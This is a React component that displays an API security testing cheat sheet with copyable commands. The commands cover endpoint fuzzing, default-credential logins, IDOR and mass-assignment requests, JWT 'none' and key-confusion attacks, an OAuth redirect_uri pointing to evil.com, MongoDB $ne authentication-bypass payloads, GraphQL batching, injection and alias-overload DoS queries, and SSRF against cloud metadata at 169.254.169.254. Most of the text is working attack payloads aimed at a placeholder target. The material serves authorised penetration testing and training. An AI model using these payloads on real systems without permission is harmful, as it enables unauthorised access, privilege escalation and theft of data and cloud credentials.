import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaNetworkWired, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { useCommandHistory } from '../../contexts/CommandHistoryContext';
import { toast } from 'react-toastify';

const APISecurityCheatsheet = () => {
  const [expandedSection, setExpandedSection] = useState(null);
  const { addToHistory } = useCommandHistory();

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    addToHistory(command);
    toast.success('Copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: '🔗 API Security Testing Walkthrough',
      content: [
        {
          type: 'markdown',
          value: `**API Security Testing** focuses on REST APIs, GraphQL APIs, and other web services. Unlike traditional web testing, APIs often have unique vulnerabilities around authentication, object-level authorization (IDOR), mass assignment, and business logic flaws.`
        },
        {
          type: 'step',
          title: '1. Discover API Endpoints',
          description: 'Find all API endpoints before testing them.',
          commands: [
            { value: 'ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt -mc 200,201,400,401,403,405', description: 'Fuzz for API endpoints' },
            { value: 'gobuster dir -u https://target.com/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,xml', description: 'Directory brute force with file extensions' },
            { value: 'curl -s https://target.com/swagger.json | jq', description: 'Check for exposed Swagger/OpenAPI docs' },
            { value: 'curl -s https://target.com/api-docs', description: 'Common API documentation paths' },
            { value: 'curl -s https://target.com/graphql', description: 'Check for GraphQL endpoint' },
          ]
        },
        {
          type: 'step',
          title: '2. Test Authentication',
          description: 'Bypass or brute-force authentication mechanisms.',
          commands: [
            { value: 'curl -X POST https://target.com/api/login -d \'{"username":"admin","password":"admin"}\'', description: 'Default credential test' },
            { value: 'curl -H "Authorization: Bearer INVALID_TOKEN" https://target.com/api/users', description: 'Test with invalid/expired JWT' },
            { value: 'curl https://target.com/api/users', description: 'Test endpoint without any auth (missing auth check)' },
          ]
        },
        {
          type: 'step',
          title: '3. Test for IDOR (Insecure Direct Object References)',
          description: 'Modify object IDs in requests to access other users\' data.',
          commands: [
            { value: 'curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/users/1', description: 'Access user ID 1 (if you are user 999, this is IDOR)' },
            { value: 'curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/orders/12345', description: 'Access another user\'s order' },
          ]
        },
        {
          type: 'step',
          title: '4. Test Mass Assignment',
          description: 'Send extra fields in requests to escalate privileges.',
          commands: [
            { value: 'curl -X POST https://target.com/api/users -H "Content-Type: application/json" -d \'{"username":"test","password":"test","is_admin":true}\'', description: 'Mass assignment — add is_admin field' },
            { value: 'curl -X PUT https://target.com/api/profile -H "Content-Type: application/json" -d \'{"email":"test@test.com","role":"admin","balance":99999}\'', description: 'Elevate role or balance via extra fields' },
          ]
        },
        {
          type: 'step',
          title: '5. Rate Limiting & Business Logic',
          description: 'Test for missing rate limits and logic flaws.',
          commands: [
            { value: 'for i in {1..50}; do curl -X POST https://target.com/api/reset-password -d \'{"email":"victim@test.com"}\'; done', description: 'Test for OTP/password reset rate limiting' },
            { value: 'curl -X POST https://target.com/api/apply-coupon -d \'{"code":"SAVE10"}\' -H "Authorization: Bearer TOKEN"', description: 'Apply coupon code multiple times (test for replay)' },
          ]
        }
      ]
    },
    {
      id: 'recon',
      title: '🔍 API Reconnaissance',
      content: [
        {
          type: 'markdown',
          value: `### Discovering APIs
\`\`\`bash
# Common API paths to check
/api
/api/v1 /api/v2 /api/v3
/rest
/graphql
/swagger.json
/swagger-ui.html
/openapi.json
/api-docs
/redoc
/.well-known/

# Check JS files for hardcoded API endpoints
curl -s https://target.com/app.js | grep -oE '"/api/[a-zA-Z0-9/_-]+'

# Use gau to find historical API endpoints
gau target.com | grep "api" | sort -u

# Check mobile apps (APK) for API endpoints
apktool d app.apk -o output/
grep -r "https://" output/ | grep -oE 'https?://[^ "]+' | sort -u
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Swagger / OpenAPI Enumeration
\`\`\`bash
# Download and parse swagger spec
curl -s https://target.com/swagger.json -o swagger.json
jq '.paths | keys' swagger.json  # List all endpoints
jq '.definitions' swagger.json   # List all data models

# Convert OpenAPI to Postman collection
npx @apidevtools/swagger-cli bundle swagger.json -o bundled.json

# Use swagger-scan
python3 swagger-scan.py -u https://target.com/swagger.json
\`\`\``
        }
      ]
    },
    {
      id: 'auth-bypass',
      title: '🔑 Authentication Attacks',
      content: [
        {
          type: 'markdown',
          value: `### JWT Attacks
\`\`\`bash
# Decode JWT (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UifQ.xxx" | cut -d. -f2 | base64 -d

# JWT None Algorithm Attack
# Change "alg": "HS256" to "alg": "none" and remove signature
# Header:
echo '{"alg":"none","typ":"JWT"}' | base64  
# Payload:
echo '{"user":"admin","role":"admin"}' | base64

# JWT Secret Bruteforce
hashcat -a 0 -m 16500 jwt.txt wordlist.txt     # hashcat
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt  # john

# JWT HS256 → RS256 confusion attack (with known public key)
python3 jwt_tool.py TOKEN -X k -pk pubkey.pem
\`\`\``
        },
        {
          type: 'markdown',
          value: `### OAuth 2.0 Attacks
\`\`\`bash
# State Parameter Missing/Bypass (CSRF)
# If no state param: forge a request and the victim's code gets used by attacker

# Open Redirect in redirect_uri
https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://evil.com/callback&response_type=code

# Token Leakage via Referrer
# Token in URL → leaked in Referer header to third-party resources

# Code Interception with PKCE downgrade
# Force code_challenge_method=plain then intercept the code_verifier

# Check token scope beyond what was authorized
# Request scope=read, try to use token for write operations
\`\`\``
        },
        {
          type: 'markdown',
          value: `### API Key Exposure
\`\`\`bash
# Scan GitHub for leaked API keys
# Use GitHub search: "target.com" "api_key" OR "apiKey"

# truffleHog — scan for secrets in git history
truffleHog git https://github.com/target/repo --only-verified

# gitleaks — detect secrets in repos
gitleaks detect --source=./repo --report-path=leak-report.json

# Check response headers for leaked keys
curl -v https://target.com/api/v1 2>&1 | grep -i "key\|token\|secret"
\`\`\``
        }
      ]
    },
    {
      id: 'idor',
      title: '👤 IDOR & Authorization Flaws',
      content: [
        {
          type: 'markdown',
          value: `### IDOR Testing Methodology
\`\`\`bash
# Step 1: Create two test accounts (Account A and Account B)
# Step 2: Perform action with Account A, note object IDs
# Step 3: Try to access Account A's objects using Account B's token

# Numeric IDOR
curl -H "Auth: Bearer TOKEN_B" https://api.target.com/users/1001/profile
curl -H "Auth: Bearer TOKEN_B" https://api.target.com/invoices/99999

# GUID/UUID IDOR (still vulnerable if guessable or leaked)
curl -H "Auth: Bearer TOKEN_B" https://api.target.com/users/550e8400-e29b-41d4-a716-446655440000

# Parameter pollution IDOR
curl "https://api.target.com/profile?user_id=attacker_id&user_id=victim_id"

# HTTP Method IDOR
curl -X GET   https://api.target.com/admin/users  # Blocked
curl -X POST  https://api.target.com/admin/users  # May bypass restriction
curl -X HEAD  https://api.target.com/admin/users  # Info leak via headers
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Broken Function Level Authorization (BFLA)
\`\`\`bash
# Test admin functions as a regular user
# Common patterns:
/api/admin/users          # Admin list endpoint
/api/v1/admin/            # Admin namespace
/api/users/delete/123     # Destructive action

# Try accessing different HTTP methods
curl -X DELETE https://api.target.com/users/999 -H "Auth: Bearer USER_TOKEN"
curl -X PATCH  https://api.target.com/users/999 -d '{"role":"admin"}' -H "Auth: Bearer USER_TOKEN"

# Horizontal → Vertical privilege escalation
# Start with IDOR to access admin user's data
# Then use admin's token for full admin access
\`\`\``
        }
      ]
    },
    {
      id: 'graphql',
      title: '📊 GraphQL Security Testing',
      content: [
        {
          type: 'markdown',
          value: `### GraphQL Introspection (Enumeration)
\`\`\`graphql
# Full introspection query (get all types, fields, mutations)
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
      }
    }
  }
}

# Find all queries and mutations
{
  __schema {
    queryType { fields { name description } }
    mutationType { fields { name description } }
  }
}
\`\`\``
        },
        {
          type: 'markdown',
          value: `### GraphQL Attack Techniques
\`\`\`graphql
# Batching Attack (rate limit bypass)
# Send multiple operations in one request:
[
  {"query": "mutation { login(user: \\"admin\\", pass: \\"password1\\") }"},
  {"query": "mutation { login(user: \\"admin\\", pass: \\"password2\\") }"},
  {"query": "mutation { login(user: \\"admin\\", pass: \\"password3\\") }"}
]

# Field Suggestion (Information Disclosure)
# If introspection is disabled, try partial field names:
{ usr { id }}  # Response: "Did you mean user?"
{ userrr { id }}  # Error reveals valid field names

# SQL/NoSQL Injection in GraphQL parameters
{ user(id: "1 OR 1=1") { email } }
{ user(username: "admin\\' --") { id } }

# Alias Overloading (DoS)
{
  q1: user(id: 1) { email }
  q2: user(id: 1) { email }
  ... (repeat 1000 times)
}
\`\`\``
        },
        {
          type: 'markdown',
          value: `### GraphQL Tools
\`\`\`bash
# GraphQL Voyager — visualize schema
# (Use browser, paste introspection result)

# graphql-cop — automated security checks
pip install graphql-cop
graphql-cop -t https://target.com/graphql

# InQL Burp Suite extension
# Install via BAppStore → auto-generates introspection, shows schema

# clairvoyance — bypass disabled introspection
python3 -m clairvoyance -o schema.json https://target.com/graphql
\`\`\``
        }
      ]
    },
    {
      id: 'injection',
      title: '💉 API Injection Attacks',
      content: [
        {
          type: 'markdown',
          value: `### NoSQL Injection
\`\`\`bash
# MongoDB — Authentication Bypass
# Normal: {"username":"admin","password":"password"}
# Attack: {"username":{"$ne":null},"password":{"$ne":null}}
curl -X POST https://api.target.com/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# MongoDB — Data Extraction with $regex
curl -X POST https://api.target.com/login \\
  -d '{"username":"admin","password":{"$regex":"^p","$options":"i"}}'

# MongoDB — nosqli operators
$ne  — not equal (bypass)
$gt  — greater than
$lt  — less than  
$regex — regex match (extraction)
$where — JS execution (dangerous!)
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Server-Side Request Forgery (SSRF)
\`\`\`bash
# Test parameters that take URLs
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
curl "https://target.com/api/webhook?callback=http://169.254.169.254"  # Cloud metadata
curl "https://target.com/api/preview?url=http://localhost:8080/admin"  # Internal services

# SSRF to Internal Services
http://127.0.0.1:6379   (Redis)
http://127.0.0.1:9200   (Elasticsearch)
http://169.254.169.254  (AWS/GCP/Azure metadata)
http://metadata.google.internal  (GCP metadata)

# Blind SSRF Detection (use Burp Collaborator or interactsh)
curl "https://target.com/api/profile?avatar_url=http://COLLABORATOR_URL"
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaNetworkWired /> API Security Cheat Sheet
      </h2>

      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive API security testing guide covering REST, GraphQL, and OAuth 2.0. 
          Covers endpoint discovery, JWT attacks, IDOR, mass assignment, injection, SSRF, 
          and GraphQL-specific techniques for beginners through advanced testers.
        </p>
      </div>

      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div animate={{ rotate: expandedSection === section.id ? 180 : 0 }}>
                <FaChevronDown />
              </motion.div>
            </motion.div>

            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header"><strong>{item.title}</strong></div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button onClick={() => handleCopy(cmd.value)} className="copy-button small">Copy</button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>{item.value}</ReactMarkdown>
                          </div>
                        </div>
                      );
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default APISecurityCheatsheet;
